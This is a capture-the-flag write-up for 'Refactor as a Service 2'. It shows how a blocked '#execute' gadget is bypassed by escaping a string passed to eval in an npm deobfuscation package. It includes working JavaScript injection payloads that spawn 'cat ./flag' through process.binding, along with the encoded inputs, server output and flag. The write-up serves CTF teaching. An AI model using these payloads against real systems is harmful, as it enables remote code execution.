# Refactor as a Service 2

## tl;dr
- Realize `#execute` gadget is now being filtered
- Read the source code of the `not-a-real-refactoring-tool` npm package to discover another `eval` gadget in `not-a-real-refactoring-tool\dist\modifications\expressions\expressionSimplifier.js`
- Use backslashes to escape the context of the double-quoted string to inject arbitrary JavaScript into the `eval` call

## Flag

```
L3AK{4lw4y5_r3m3mb3r_2_3sc4p3_B4cK5la5h3S!}
```

## Detailed Solution

### Enumerating the filter

Once again, no source code. Let's first check if the server is still using the same npm package by reusing the technique to throw an error from part 1:

```
steak@L3AKCTF:~$ nc 193.148.168.30 6671

/$$$$$$$                       /$$$$$$
| $$__  $$                     /$$__  $$
| $$  \ $$  /$$$$$$   /$$$$$$ | $$  \__/
| $$$$$$$/ |____  $$ |____  $$|  $$$$$$
| $$__  $$  /$$$$$$$  /$$$$$$$ \____  $$
| $$  \ $$ /$$__  $$ /$$__  $$ /$$  \ $$
| $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$/
|__/  |__/ \_______/ \_______/ \______/

Welcome to Refactor as a Service!
Please enter your base64 encoded JavaScript code for processing:
zz
Error during refactoring Error: [1:1]: Unexpected "�"
    at new JsError (/home/ctfuser/app/node_modules/shift-parser/dist/tokenizer.js:166:104)
    at GenericParser.createError (/home/ctfuser/app/node_modules/shift-parser/dist/tokenizer.js:297:14)
    at GenericParser.createILLEGAL (/home/ctfuser/app/node_modules/shift-parser/dist/tokenizer.js:256:53)
    at GenericParser.advance (/home/ctfuser/app/node_modules/shift-parser/dist/tokenizer.js:1542:20)
    at GenericParser.parseScript (/home/ctfuser/app/node_modules/shift-parser/dist/parser.js:276:29)
    at parse (/home/ctfuser/app/node_modules/shift-parser/dist/index.js:172:43)
    at deobfuscate (/home/ctfuser/app/node_modules/not-a-real-refactoring-tool/dist/index.js:44:44)
    at Refactorer.refactorCode (file:///home/ctfuser/app/index.js:61:16)
    at Refactorer.handleInput (file:///home/ctfuser/app/index.js:42:41)
    at Interface.emit (node:events:519:28) {
  index: 0,
  line: 1,
  column: 1,
  parseErrorLine: 1,
  parseErrorColumn: 1,
  description: 'Unexpected "�"'
}
Goodbye!
```

Looks like it's using the same `not-a-real-refactoring-tool` npm package. Let's try re-using our exploit from part 1:

```js
function a() {
    '#execute'
    let result = process.binding("spawn_sync").spawn({ file: "cat", args: ["cat", "./flag"], stdio: [{ type: "pipe", readable: true, writable: false }, { type: "pipe", readable: false, writable: true }, { type: "pipe", readable: false, writable: true },], }); let output = result.output[1].toString(); console.log(output)
}
a();
```

Base64 encoding this and sending it to the server:

```
Welcome to Refactor as a Service!
Please enter your base64 encoded JavaScript code for processing:
ZnVuY3Rpb24gYSgpIHsNCiAgICAnI2V4ZWN1dGUnDQogICAgbGV0IHJlc3VsdCA9IHByb2Nlc3MuYmluZGluZygic3Bhd25fc3luYyIpLnNwYXduKHsgZmlsZTogImNhdCIsIGFyZ3M6IFsiY2F0IiwgIi4vZmxhZyJdLCBzdGRpbzogW3sgdHlwZTogInBpcGUiLCByZWFkYWJsZTogdHJ1ZSwgd3JpdGFibGU6IGZhbHNlIH0sIHsgdHlwZTogInBpcGUiLCByZWFkYWJsZTogZmFsc2UsIHdyaXRhYmxlOiB0cnVlIH0sIHsgdHlwZTogInBpcGUiLCByZWFkYWJsZTogZmFsc2UsIHdyaXRhYmxlOiB0cnVlIH0sXSwgfSk7IGxldCBvdXRwdXQgPSByZXN1bHQub3V0cHV0WzFdLnRvU3RyaW5nKCk7IGNvbnNvbGUubG9nKG91dHB1dCkNCn0NCmEoKTs=
Unsafe code detected! Exiting...
Goodbye!
```

We get the response `Unsafe code detected! Exiting...`. To try to narrow down what is being filtered, let's instead just send the string `execute` base64 encoded:

```
Welcome to Refactor as a Service!
Please enter your base64 encoded JavaScript code for processing:
ZXhlY3V0ZQ==
Unsafe code detected! Exiting...
Goodbye!
```

Looks like the server is detecting occurences of the string `execute`. However, we know that the refactoring tool performs simplification of expressions, so maybe we can try splitting up `#execute` at the top of our exploit. For testing, let's try:

```js
function a() {
    '#exe'+'cute'
    console.log("Arbitrary code execution?!?!?")
}
a();
```

Sending this off:

```
Welcome to Refactor as a Service!
Please enter your base64 encoded JavaScript code for processing:
ZnVuY3Rpb24gYSgpIHsNCiAgICAnI2V4ZScrJ2N1dGUnDQogICAgY29uc29sZS5sb2coIkFyYml0cmFyeSBjb2RlIGV4ZWN1dGlvbj8hPyE/IikNCn0NCmEoKTs=
Refactored Code:
function a() {
  ("#execute");
  console.log("Arbitrary code execution?!?!?");
}
a();

Goodbye!
```

Well, looks like the strings `"#exe" + "cute"` were concatenated into `"#execute"`. However, `"Arbitrary code execution?!?!?"` was not printed, which implies our code wasn't executed. Trying similar bypasses such as adding spaces, hex/octal encoding the string etc, also yield no positive results.

### Analyzing the source code of the `#execute` gadget

Unable to determine what to do next, now would be a good time to start digging into the source code of the [not-a-real-factoring-tool npm package](https://www.npmjs.com/package/not-a-real-refactoring-tool).

A good place to start would be trying to understand how the `'#execute'` gadget works, so that we can try to come up with a filter bypass for it. We can find the relevant code in `not-a-real-refactoring-tool\dist\modifications\execution\functionExecutor.js`:

```js
    /**
     * Finds all the executed functions.
     */
    findExecutedFunctions() {
        const self = this;
        let scope = this.globalScope;
        (0, traverse_1.traverse)(this.ast, {
            enter(node, parent) {
                if (self.functionTypes.has(node.type) && node.body.directives) {
                    const directive = node.body.directives.find((d) => d.rawValue.startsWith('#execute'));
                    if (directive) {
                        let name;
                        if (node.type == 'FunctionDeclaration') {
                            name = node.name.name;
                        }
                        else {
                            const result = directive.rawValue.match(/#execute\[name=(.*)\]/);
                            if (result) {
                                name = result[1];
                            }
                        }
                        const executedFunction = new executedFunction_1.default(node, parent, name);
                        scope.addExecutedFunction(executedFunction);
                        self.executedFunctions.push(executedFunction);
                        if (!self.foundExecutedFunction) {
                            self.foundExecutedFunction = true;
                        }
                    }
                }
                if (self.scopeTypes.has(node.type)) {
                    scope = new scope_1.default(node, scope);
                }
            },
            leave(node) {
                if (node == scope.node && scope.parent) {
                    scope = scope.parent;
                }
            }
        });
    }
```

This code is traversing the AST of the JavaScript code and looking for functions that have a directive starting with `#execute`. If it finds one, it creates an `executedFunction` object and adds it to the `scope` object. This `executedFunction` object is then added to the `executedFunctions` array. 

Tracing through the code a bit more, we find the `ExecutedFunction` class in `not-a-real-refactoring-tool\dist\modifications\execution\executedFunction.js`:

```js

class ExecutedFunction {
    /**
     * Creates a new executed function.
     * @param func The function node.
     * @param parent The parent node.
     * @param name The name of the function (optional).
     */
    constructor(func, parent, name) {
        /* ... snip ... */
        this.evaluate();
    }
    /**
     * Attempts to evaluate the function.
     */
    evaluate() {
        /* ... snip ... */
        try {
            const code = (0, shift_codegen_1.codeGen)(func);
            eval.call(this, code);
        }
        catch (err) {
            this.didError = true;
        }
    }
    /* ... snip ... */
}
```

Looks like the function's body gets passed into `eval`.

Out of the 7 teams that solved the first part of the challenge, only 3 were able to solve the 2nd part. Based on the tickets, many of them spent a lot of time trying to find a bypass for the blacklisting of `execute`. I'll briefly explain why these attempts did not work:

1. Appending to the `'#execute'` string:
   - The line `const directive = node.body.directives.find((d) => d.rawValue.startsWith('#execute'));` suggests that the directive does not need to be exactly `'#execute'`, but only needs to start with it. So, a directive like `"#executeBlahBlahBlah"` should still allow us to reach the eval. However, the unsafe code filter checks for the string `"execute"` _anywhere_ in the code, so this still fails the check.
2. Encoding `'#execute'` into a hex or octal escaped string:
   - This is a decent try. However, the `shift-parser` package will keep the backslashes in the string, such that `directive.rawValue` for `"\x65\x78\x65\x63\x75\x74\x65"` will be parsed into to the JavaScript string literal: `"\\x65\\x78\\x65\\x63\\x75\\x74\\x65"`. This will not match the required string `'#execute'`. This can be verified by cloning the `not-a-refactoring-tool` npm package, and using RCE on the first part of the challenge to obtain the original source code for the `index.js` and `package.json` files to build the challenge locally and debug.
3. Splitting up the `'#execute'` directive:
   - We observed that the program transforms binary expressions such as `"#exe" + "cute"` into `"#execute"`. However, examining the code of `not-a-real-refactoring-tool\dist\index.js` reveals the following:
    ```js
    /**
    * Deobfuscates a given source script.
    * @param source The source script.
    * @param config The deobfuscation configuration (optional).
    * @returns The deobfuscated script.
    */
   function deobfuscate(source, config = defaultConfig) {
       const ast = (0, shift_parser_1.default)(source);
       const modifications = [];
       // function execution should always be checked for
       modifications.push(new functionExecutor_1.default(ast));
       if (config.proxyFunctions.replaceProxyFunctions) {
           modifications.push(new proxyRemover_1.default(ast, config.proxyFunctions.removeProxyFunctions));
       }
       if (config.expressions.simplifyExpressions) {
           modifications.push(new expressionSimplifier_1.default(ast));
       }
       if (config.arrays.unpackArrays) {
           modifications.push(new arrayUnpacker_1.default(ast, config.arrays.removeArrays));
       }
       // simplify any expressions that were revealed by the array unpacking
       if (config.expressions.simplifyExpressions) {
           modifications.push(new expressionSimplifier_1.default(ast));
       }
       if (config.expressions.removeDeadBranches) {
           modifications.push(new deadBranchRemover_1.default(ast));
       }
       if (config.miscellaneous.simplifyProperties) {
           modifications.push(new propertySimplifier_1.default(ast));
       }
       if (config.miscellaneous.renameHexIdentifiers) {
           modifications.push(new variableRenamer_1.default(ast));
       }
       for (const modification of modifications) {
           if (config.verbose) {
               console.log(`[${new Date().toISOString()}]: Executing ${modification.constructor.name}`);
           }
           modification.execute();
       }
       cleanupHelper_1.default.cleanup(ast);
       const output = config.miscellaneous.beautify
           ? (0, shift_codegen_1.codeGen)(ast, new shift_codegen_1.FormattedCodeGen())
           : (0, shift_codegen_1.codeGen)(ast);
       return output;
   }
   ```
   - The `functionExecutor` modification is _always executed first, then never again_. Thus, even after the binary expression `"#exe" + "cute"` is transformed into `"#execute"` by the `simplifyExpressions` transformer, the `functionExecutor` will not be ran again to detect this change in the function.

As far as I am aware, there is no way to bypass the filter to reach the `eval` call in the `ExecutedFunction` class. Some teams tried to investigate the `shift-parser` challenge to find a parser differential, but were unsuccessful. Nonetheless, doing that was not necessary to solve the challenge.

### Another eval gadget

We know that the goal of the challenge is to obtain RCE. We know that the npm package used `eval` for simplification of functions, perhaps they use it in other places too? CTRL-F'ing for `eval` in the codebase reveals one other use of eval, in `not-a-real-refactoring-tool\dist\modifications\expressions\expressionSimplifier.js`:

```js
/**
     * Evaluates a given piece of code and converts the result to an
     * expression node if possible.
     * @param code The code to be evaluated.
     */
    evalCodeToExpression(code) {
        let value;
        try {
            value = eval(code);
        }
        catch (err) {
            return null;
        }
        switch (typeof value) {
            /* ... snip ... */
        }
    }
```

With this in mind, we start looking into ways we can reach this `eval` call with user-controlled input. The `evalCodeToExpression` function is referenced in two functions, `simplifyBinaryExpression` and `simplifyUnaryExpression`:

```js
    /**
     * Attempts to simplify a binary expression node.
     * @param expression The binary expression node.
     */
    simplifyBinaryExpression(expression) {
        const left = this.simplifyExpression(expression.left);
        const right = this.simplifyExpression(expression.right);
        const leftValue = this.getExpressionValueAsString(left);
        const rightValue = this.getExpressionValueAsString(right);
        if (leftValue != null && rightValue != null) {
            const code = `${leftValue} ${expression.operator} ${rightValue}`;
            const simplified = this.evalCodeToExpression(code);
            return simplified != null ? simplified : expression;
        }
        else {
            return expression;
        }
    }
    /**
     * Attempts to simplify a unary expression node.
     * @param expression The unary expression node.
     */
    simplifyUnaryExpression(expression) {
        expression.operand = this.simplifyExpression(expression.operand);
        const code = this.getExpressionValueAsString(expression);
        if (code != null) {
            const simplified = this.evalCodeToExpression(code);
            return simplified != null ? simplified : expression;
        }
        else {
            return expression;
        }
    }
```

These both seem to essentially perform the similar operations. They have the dependency of `getExpressionValueAsString`:

```js
/**
     * Returns the value of a node as a string, null if not possible.
     * @param expression The expression node.
     */
    getExpressionValueAsString(expression) {
        switch (expression.type) {
            case 'LiteralStringExpression':
                const value = expression.value
                    .replace(/"/g, '\\"')
                    .replace(/\n/g, '\\n')
                    .replace(/\r/g, '\\r');
                return `"${value}"`;
            case 'LiteralNumericExpression':
            case 'LiteralBooleanExpression':
            /* ... snip ... */
            default:
                return null;
        }
    }
```

The `'LiteralStringExpression'` case seems to be the most interesting, performing some string manipulation with `.replace` before returning the string. In summary, it does the following 3 things:

1. Escapes all double quotes with `\\"`
2. Escapes all newline characters with `\\n`
3. Escapes all carriage return characters with `\\r`

In JavaScript, a backslash before a character indicates an escaped character. For example, code like `console.log("Quotes: \"\"")` would print `Quotes: ""` to the console, and `console.log("Backslash: \\")` would print `Backslash: \`. 

The code does not escape backslashes, which we can exploit. By injecting a backslash into the string, we can escape the double-quoted string's context and inject arbitrary JavaScript into the `eval` call. For testing, we can use the following code:

```js
function doReplace(string){
    const transformed =  string.replace(/"/g, '\\"')
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r');
    return `"${transformed}"`;
}
console.log(doReplace('hello\\"; console.log(`Arbitrary code execution?!?!?`);'));
```

Results in:

```js
"hello\\"; console.log(`Arbitrary code execution?!?!?`);"
```

From the syntax highlighting, we see that the single backslash we added escapes the backslash that was meant to escape the double quote. This allows us to close the string early and inject arbitrary JavaScript. Note that there is a trailing double quote at the end of the string, but we can add a comment to the end of our payload to avoid any syntax errors.
Putting this inside of a UnaryExpression, we get the payload:

```js
!'hello\\"; console.log(`Arbitrary code execution?!?!?`);//'
```

Base64 encoding this and sending it to the server:

```
steak@L3AKCTF:~$ nc 193.148.168.30 6671

/$$$$$$$                       /$$$$$$
| $$__  $$                     /$$__  $$
| $$  \ $$  /$$$$$$   /$$$$$$ | $$  \__/
| $$$$$$$/ |____  $$ |____  $$|  $$$$$$
| $$__  $$  /$$$$$$$  /$$$$$$$ \____  $$
| $$  \ $$ /$$__  $$ /$$__  $$ /$$  \ $$
| $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$/
|__/  |__/ \_______/ \_______/ \______/

Welcome to Refactor as a Service!
Please enter your base64 encoded JavaScript code for processing:
ISdoZWxsb1xcIjsgY29uc29sZS5sb2coYEFyYml0cmFyeSBjb2RlIGV4ZWN1dGlvbj8hPyE/YCk7Ly8n
Arbitrary code execution?!?!?
Arbitrary code execution?!?!?
Refactored Code:
!'hello\\"; console.log(`Arbitrary code execution?!?!?`);//';

Goodbye!
```

And we find that the `console.log` statement was executed! 

### Final exploit

Let's format our exploit from part 1 to use this new gadget:

```js
!'hello\\";let result = process.binding(`spawn_sync`).spawn({ file: `cat`, args: [`cat`, `./flag`], stdio: [{ type: `pipe`, readable: true, writable: false }, { type: `pipe`, readable: false, writable: true }, { type: `pipe`, readable: false, writable: true },], }); let output = result.output[1].toString(); console.log(output)//'
```

All that's left is to base64 encode this and send it to the server:

```
steak@L3AKCTF:~$ nc 193.148.168.30 6671

/$$$$$$$                       /$$$$$$
| $$__  $$                     /$$__  $$
| $$  \ $$  /$$$$$$   /$$$$$$ | $$  \__/
| $$$$$$$/ |____  $$ |____  $$|  $$$$$$
| $$__  $$  /$$$$$$$  /$$$$$$$ \____  $$
| $$  \ $$ /$$__  $$ /$$__  $$ /$$  \ $$
| $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$/
|__/  |__/ \_______/ \_______/ \______/

Welcome to Refactor as a Service!
Please enter your base64 encoded JavaScript code for processing:
ISdoZWxsb1xcIjtsZXQgcmVzdWx0ID0gcHJvY2Vzcy5iaW5kaW5nKGBzcGF3bl9zeW5jYCkuc3Bhd24oeyBmaWxlOiBgY2F0YCwgYXJnczogW2BjYXRgLCBgLi9mbGFnYF0sIHN0ZGlvOiBbeyB0eXBlOiBgcGlwZWAsIHJlYWRhYmxlOiB0cnVlLCB3cml0YWJsZTogZmFsc2UgfSwgeyB0eXBlOiBgcGlwZWAsIHJlYWRhYmxlOiBmYWxzZSwgd3JpdGFibGU6IHRydWUgfSwgeyB0eXBlOiBgcGlwZWAsIHJlYWRhYmxlOiBmYWxzZSwgd3JpdGFibGU6IHRydWUgfSxdLCB9KTsgbGV0IG91dHB1dCA9IHJlc3VsdC5vdXRwdXRbMV0udG9TdHJpbmcoKTsgY29uc29sZS5sb2cob3V0cHV0KS8vJw==
L3AK{4lw4y5_r3m3mb3r_2_3sc4p3_B4cK5la5h3S!}

L3AK{4lw4y5_r3m3mb3r_2_3sc4p3_B4cK5la5h3S!}

Refactored Code:
!'hello\\";let result = process.binding(`spawn_sync`).spawn({ file: `cat`, args: [`cat`, `./flag`], stdio: [{ type: `pipe`, readable: true, writable: false }, { type: `pipe`, readable: false, writable: true }, { type: `pipe`, readable: false, writable: true },], }); let output = result.output[1].toString(); console.log(output)//';

Goodbye!
```

And we get the flag, `L3AK{4lw4y5_r3m3mb3r_2_3sc4p3_B4cK5la5h3S!}`!